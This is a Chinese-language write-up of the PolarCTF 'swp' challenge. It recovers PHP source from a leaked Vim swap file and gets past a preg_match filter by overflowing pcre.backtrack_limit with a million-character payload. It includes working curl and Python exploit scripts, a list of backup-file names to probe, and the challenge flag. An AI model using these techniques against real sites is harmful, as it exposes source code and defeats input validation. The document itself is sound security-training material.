# PolarCTF · swp Writeup

| 项 | 内容 |
|---|---|
| 赛事 | PolarCTF |
| 题目 | swp |
| 考点 | Vim 交换文件泄露 / `preg_match` 三态返回值 / PCRE 回溯上限绕过 |
| flag | `flag{4560b3bfea9683b050c730cd72b3a099}` |
| 状态 | ✅ 已通关（两道实例） |
| 原始记录 | [logs/2026-10-03.md](../../logs/2026-10-03.md) |

> 相关笔记：[10 · 信息收集与代码审计](../../notes/10-信息收集与代码审计.md)（vim 交换文件命名规则）、[11 · 速查卡 ⑪](../../notes/11-速查卡.md)（PCRE 回溯绕过）

---

## 一句话

> 题目只有一个 `preg_match` 挡在门口，但它**不是一堵墙、而是一个会报错的函数** —— 不用想办法让正则「不匹配」，只要用 100 万个字符把 `pcre.backtrack_limit`（默认 `1000000`）撑爆，让它**出错返回 `false`**，`!preg_match(...)` 就直接成立。

---

## 一、源码泄露：Vim 交换文件

### 1.1 现象

```
GET /.index.php.swp   → 200，340 字节（sha256 d86a6d80…）
```

出题人（或"运维"）用 Vim 编辑过 `index.php`，编辑器崩溃 / 非正常退出时会把**内存里的编辑缓冲区**写成交换文件留在同目录。它**不是语法高亮的快照，而是接近完整的源码明文**（Vim 只做少量块封装）。

### 1.2 Vim 交换文件命名规则（有限候选集，一次全试完）

```
编辑 index.php  →  .index.php.swp
同名冲突时      →  .index.php.swo / .swn
备份类          →  index.php~ / .index.php.un~ / index.php.bak
```

| 候选 | 含义 |
|---|---|
| `.index.php.swp` | **主交换文件**（最常考，本题就是它） |
| `.index.php.swo` | 同名冲突时的第二个交换文件 |
| `.index.php.swn` | 再冲突（第三个） |
| `index.php~` | Vim 的 `backup` 备份文件 |
| `.index.php.un~` | Vim 的 undo 历史（`undofile`） |
| `index.php.bak` | 人工备份 |

> **⚠️ 别只试 `.swp`** —— 候选集是有限的，一次全试完，成本几乎为零。

### 1.3 拿到之后先"验真"

日志里的做法：**`php -l` 语法检查 + 逐字节 hexdump 确认源码**，比肉眼读更可靠（交换文件里混着控制字节，肉眼容易看漏 / 看错）。

---

## 二、审计：为什么常规输入无解

### 2.1 题目源码（从 swp 恢复）

```php
function jiuzhe($xdmtql){
    return preg_match('/sys.*nb/is', $xdmtql);
}
$xdmtql = @$_POST['xdmtql'];
if (!is_array($xdmtql)) {
    if (!jiuzhe($xdmtql)) {                       // ← 要满足 !preg_match(...)
        if (strpos($xdmtql, 'sys nb') !== false) {
            echo 'flag{...}';                     // ← 目标分支
        } else { echo 'true .swp file?'; }
    } else { echo 'nijilenijile'; }
}
```

### 2.2 矛盾点

条件被串成一条 AND：

| 层 | 要求 | 代码 |
|---|---|---|
| 第一层 | **不能被正则匹配到** | `!preg_match('/sys.*nb/is', $xdmtql)` |
| 第二层 | **值里必须含 `sys nb`（带一个空格）** | `strpos($xdmtql, 'sys nb') !== false` |

而 `/sys.*nb/is` 里的 `.` **能匹配空格**：

- `s` 修饰符（`/s`）= **让 `.` 也匹配换行符**，本来就匹配空格；
- `i` 修饰符 = 忽略大小写。

所以字符串 `sys nb` **必然**被 `/sys.*nb/is` 匹配到 → `preg_match` 返回 `1` → `!1 === false` → 直接掉进 `nijilenijile`（"你记了你记了"）。
**两个条件在常规输入下互斥。**

### 2.3 白盒审计的正确顺序：先穷举常规路，把它排除掉

这题花了不少请求去**穷举所有分隔符**，看似白费，实际是必要的 —— 它把"编码 trick"这**一整类**思路排除掉了：

| 测过的 | 结果 |
|---|---|
| 1–255 全部单字节分隔符 | 全部被拦 |
| `%2520` / `%2B` 双重编码 | 全部被拦 |
| nbsp / NUL / VT / FF / DEL | 全部被拦 |
| `sysnb` / `sys\tnb` / `sys\nnb` | 全部被拦（`. + /s` 修饰符） |
| 数组 `xdmtql[]=...` | 空响应（进 `is_array` 分支） |

> **这一步的价值**：**排除了"编码 trick"这一整类思路**，逼自己去找"函数返回错误"这种非匹配层面的出路。
>
> 换句话说：**穷举不是为了试出答案，而是为了证明"常规路不通"** —— 只有排干净了，才会去想"让函数报错"。

---

## 三、正解：让 `preg_match` 出错返回 `false`

### 3.1 `preg_match()` 是三态返回值

> `preg_match()` 是**三态**返回值：`1` 匹配 / `0` 不匹配 / **`false` 出错**。
> 而 `!false === true` → 直接过掉第一层校验。

| 返回值 | 含义 | `!preg_match(...)` |
|---|---|---|
| `1` | **匹配成功** | `false` → 掉 `nijilenijile` |
| `0` | **匹配失败**（跑完了，确实没匹配上） | `true` → 过第一层 |
| **`false`** | **函数出错**（PCRE 内部错误 / 回溯超限） | **`true`** → **过第一层** ⭐ |

**关键认知转变**：不是"绕过正则"，而是**让正则引擎自己放弃**。

### 3.2 触发方式：`pcre.backtrack_limit`

`pcre.backtrack_limit` **默认 `1000000`**。贪婪的 `.*` 要回退 100 万次才能确认后面没有 `nb`，步数预算爆掉 → PCRE 报错（`PREG_BACKTRACK_LIMIT_ERROR`）→ `preg_match` 返回 `false`。

```
payload = "sys nb" + "a" × 1000000      # 共 1000006 字节
```

### 3.3 ⭐ 关键：填充位置决定成败

| 写法 | 为什么失败/成功 |
|---|---|
| `"sys" + "a"*1e6 + " nb"` | ❌ 贪婪 `.*` 吞掉 `a` 串后**立刻**找到 `nb` → 回溯次数极少 |
| **`"sys nb" + "a"*1e6`** | ✅ `.*` 必须从百万个 `a` 的末尾**一路回退** → 撑爆上限 |

> **回溯爆炸的触发条件不是"字符串够长"，而是"必须回退足够多次"。**

用正则引擎的视角走一遍就清楚了：

```
正则： sys .* nb          （两个锚点：先 sys，再 nb）
输入A：sys aaaa…aaaa nb   ← nb 就在 a 串末尾，.* 吞完 a 只回退 1~2 步就命中
输入B：sys nb aaaa…aaaa   ← 先匹配 sys，.* 吞掉"nb + 全部 a"，
                            然后为了找 nb 必须从最末尾一路吐回来，
                            每吐一个字符试一次 → 100 万步 → 预算爆 → 报错
```

**推论**：想撑爆限制，必须把**目标子串放在被 `.*` 吞掉的那一段里，且离右侧起点尽量远**。

---

## 四、完整利用链

```bash
BASE=http://<host>:8090

# ① 按 Vim 命名规则枚举交换文件
curl -s "$BASE/.index.php.swp"      # → 340 字节源码（sha256 d86a6d80…）

# ② 基线校验（确认过滤逻辑与源码一致）
curl -s -X POST --data "xdmtql=abc"    "$BASE/"   # → true .swp file?
curl -s -X POST --data "xdmtql=sys nb" "$BASE/"   # → nijilenijile

# ③ 回溯爆炸
python -c "import sys;sys.stdout.write('xdmtql=sys nb'+'a'*1000000)" > p.txt
curl -s -X POST --data-binary @p.txt "$BASE/"
# → flag{4560b3bfea9683b050c730cd72b3a099}
```

### 4.1 基线校验为什么必须做

| 请求 | 响应 | 结论 |
|---|---|---|
| `xdmtql=abc` | `true .swp file?` | 不匹配（`0`）且不含目标串 → 走到最后 `else`，**说明参数确实进来了** |
| `xdmtql=sys nb` | `nijilenijile` | 匹配成功（返回 `1`）→ **说明过滤逻辑与 swp 源码一致** |

两条基线一立，才能确认第三步的 payload **是在跟真的校验逻辑对抗**，而不是在跟 404 / WAF / 参数名写错对抗。

### 4.2 用 Python 复现（不依赖 shell 拼超长参数）

```python
import requests

BASE = "http://<host>:8090"

# 基线
print(requests.post(BASE + "/", data={"xdmtql": "abc"}).text)     # true .swp file?
print(requests.post(BASE + "/", data={"xdmtql": "sys nb"}).text)  # nijilenijile

# 回溯爆炸：填充放在后面
payload = "sys nb" + "a" * 1000000
r = requests.post(BASE + "/", data={"xdmtql": payload})
print(len(payload), r.status_code)
print(r.text)   # flag{4560b3bfea9683b050c730cd72b3a099}
```

### 4.3 判据速记（swp 相关）

| 现象 | 结论 |
|---|---|
| `/.index.php.swp` 返回 200 | 源码泄露（Vim 命名规则固定） |
| `nijilenijile` | `preg_match` 匹配成功（返回 `1`） |
| `true .swp file?` | 不匹配且不含目标串（走到最后 `else`） |
| 空响应体 | `is_array` 分支（传了数组） |
| 卡在"只回显标题" | 参数名或值不对 |

---

## 五、踩坑

| 问题 | 原因 | 解决 |
|---|---|---|
| **`"sys" + "a"*1e6 + " nb"` 失败** | 回溯次数不够（`.*` 吞完就找到 `nb` 了） | 填充放到**后面**：`"sys nb" + "a"*1e6` |
| **以为要"绕过正则"** | 思路锁在"让正则不匹配" | 真正的出路是**让正则出错**（返回 `false`） |
| **2 万个 `a` 不够** | 未达 `backtrack_limit` | 需要 ≥ 100 万（实测 1e6 稳定触发） |
| **`Format-Hex` 看不到内容** | 无参数调用没输出 | 用 `[System.IO.File]::ReadAllBytes` + 手工 hexdump |
| **PowerShell 函数名 `R`** | 撞了 `Invoke-History` 别名 | 换名；或改用 Python 驱动 |
| **响应被 `Select-Object -First` 截断** | 中文多行输出被截 | 用 Python + `PYTHONIOENCODING=utf-8` |
| **只试了 `.swp` 没试别的后缀** | 以为只有一个候选 | `.swo` / `.swn` / `~` / `.un~` / `.bak` 一次全试 |
| **不敢确定源码是真源码** | 交换文件里混着控制字节 | `php -l` 语法检查 + hexdump 逐字节确认 |

---

## 六、可复用方法论

### 6.1 源码泄露三连（拿到源码 = 白盒审计，降维打击）

```
① 按框架/编辑器惯例枚举备份：.swp/.swo/.swn/~/.un~/bak/www.zip/.git/
② 拿到文件先验魔数、验语法（php -l），别信后缀
③ 逐行读校验逻辑 → 画出"条件之间的与或关系"
```

### 6.2 ⭐ 校验逻辑先"画条件表"，再看是否互斥

把每一层校验拆成「要求 / 代码」两列（见 §2.2）。**一旦发现两个条件在正常输入下互斥，就说明出题人给的不是"过滤"，而是"函数的异常行为"这个入口。**

### 6.3 ⭐ 白盒审计的正确顺序

```
① 先穷举所有"常规思路"（编码、分隔符、数组、大小写…），把它们逐条证伪
② 穷举的意义不是试出答案，而是【排除一整个思路类别】
③ 排干净之后，剩下的出口往往在"函数语义"层面：
   - 返回值三态（1 / 0 / false）
   - 类型强转与弱比较
   - 报错、超时、超限、递归深度
```

### 6.4 正则题的三个方向（按成本排序）

| 方向 | 做法 | 本题适用性 |
|---|---|---|
| 让正则**不匹配** | 找正则没覆盖的分隔符 / 编码 | ❌ 已穷举证伪（§2.3） |
| 让正则**被绕过** | 双解析差异（WAF 与解释器看到不同东西） | ❌ 本题无 WAF 层 |
| ⭐ 让正则**报错** | 回溯超限 `pcre.backtrack_limit`、递归深度 `pcre.recursion_limit` | ✅ **本题正解** |

### 6.5 一句话带走

> **"没反应"是多义的** —— 正则匹配了 / 参数没进去 / 分支走错 / 编码被吃。
> 必须靠**基线对照**（`abc` vs `sys nb`）和**可验证中间量**（响应长度、Content-Length）来定位。
